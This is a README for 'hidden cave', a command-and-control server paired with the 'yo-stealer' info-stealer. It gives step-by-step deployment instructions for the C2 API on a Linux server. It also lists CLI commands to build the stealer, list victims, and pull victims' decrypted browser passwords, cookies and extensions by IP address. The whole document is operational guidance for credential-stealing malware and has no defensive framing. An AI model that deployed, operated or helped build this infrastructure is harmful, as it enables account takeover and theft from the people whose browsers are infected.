<div align="center">
  <h1>hidden cave</h1>
  <br/>

  <p><i>hidden cave is an API-based C2 server for handling the yo-stealer.</i></p>
  <br />

  <img src="assets/main.png" width="90%" /><br />

</div>

## Prerequisites
> :information_source: the C2 API can only be deployed on linux servers, but the CLI that will be used to connect to the API and make interacting with it easier can work on any OS.

for the C2 API:
  - Nginx `sudo apt-get install nginx`
  - Gunicorn `sudo apt-get install gunicorn`
  - Install requirements.txt `pip3 install -r requirements.txt`

for the CLI:
  - Python (minimum 3.8)
  - The GNU Compiler Collection for windows you can download it from [winlibs](https://winlibs.com/#download-release) for linux you can use the package manager. Make sure to add the installation directory to your system path environment variable.
  - Install requirements.txt `pip install -r requirements.txt`

## Deployment
After making sure the prerequisites for each part is installed we need to generate the setting.json file that the API needs, to do so, we will launch the CLI `python main.py`.  
Then we will use the init command to generate random cryptographic parameters and to set the API url which is the public IP of the server that we will deploy the API in and the port where we can access the API.
```
$HiddenCave-> init
Choose an option:
        1. Set cryptographic parameters
        2. Set API URL
[+] Do you wanna generate random parameters? (Y/N) y
[+] Done.
$HiddenCave-> init
Choose an option:
        1. Set cryptographic parameters
        2. Set API URL
[+] Enter the number (1 or 2): 2
    Example of a valid URL: http://<ip address>:<port>
API: http://127.0.0.1:1124
[+] Done.
```
then we need to save the settings we set to a json file using he save command
```
$HiddenCave-> save settings.json
[+] Done.
```
Then we will copy the settings.json to the api folder and transfer the api folder to the server we plan to deploy it in.  
> :information_source: We need to make sure the port we wanna serve the API in is open, depends on what hosting provider you use, you can open the port in the panel.

in the linux server after installing nginx and gunicorn, we will launch the predeploy.py script that will generate 2 files api.conf and apiserv.service.
  - apiserv.service is the service file we will use to run the API, so even if the server reboot the API will automaticlly start. 
  - api.conf is the nginx config file to tell nginx to pass web requests to gunicorn.

We need to copy the apiserv.service to the services folder which is /etc/systemd/system/ with `sudo cp apiserv.service /etc/systemd/system/`, then we can start the service `sudo systemctl start apiserv` then `sudo systemctl enable apiserv`.  
Then check the it's status `sudo systemctl status apiserv` if says `Active: active (running)` that means everything is running as it supposed.

After that we need to enable the nginx config file, to do so we need to copy it to the /etc/nginx/sites-available `sudo cp api.conf /etc/nginx/sites-available/` then link the file to the sites-enabled directory `sudo ln -s /etc/nginx/sites-available/api.conf /etc/nginx/sites-enabled`, now restart nginx `sudo systemctl restart nginx`

Now that our API has been deployed, we will launch the CLI again and use the load command to load the settings.json file we created earlier, then we will use the check command to check if the API is reachable, and the cryptographic parameters are correct, just to make sure everything is working.
```
$HiddenCave-> load settings.json
[+] Done.
$HiddenCave-> check
[+] All good.
```

## Usage
These are the available commands:
  - build, can be used to build the stealer.
  - check, can be used to check that the API is reachable and validate the cryptographic parameters.
  - clear, can be used to clear the stdout.
  - exit, can be used to exit the CLI.
  - grabdata, can be used to grab victim's browser data (decrypted password and cookies), usage `grabdata <victim's IP address>`.
  - grabraw, can be used to grab victim's data (encrypted password and cookies, and extentions), usage `grabraw <victim's IP address>`.
  - help, can be used to display command description and usage, usage `help <command>` 
  - init, can be used to generate random cryptographic parameters, and set the API url.
  - listv, can be used to list all victims and the grabbed data.
  - load, can be used to load setting file, usage `load <file.json>`.
  - save, can be used to save setting file, usage `save <file.json>`.

Please check out the API [README](https://github.com/yo-aiv1/hiddencave/api/APIDOC.md) for the API documentation
